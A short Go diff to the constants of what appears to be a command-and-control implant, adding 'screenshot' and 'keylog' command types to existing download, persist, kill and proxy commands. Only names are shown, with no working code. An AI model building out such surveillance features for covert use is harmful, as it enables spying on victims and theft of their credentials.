@@ -8,8 +8,10 @@ const (
 	CmdTypeDownload = "download"
 	CmdTypeSleep    = "sleep"
 	CmdTypePersist  = "persist"
-	CmdTypeKill     = "kill"
-	CmdTypeProxy    = "proxy"
+	CmdTypeKill       = "kill"
+	CmdTypeProxy      = "proxy"
+	CmdTypeScreenshot = "screenshot"
+	CmdTypeKeylog     = "keylog"
 
 	StatusPending   = "pending"
 	StatusExecuting = "executing"
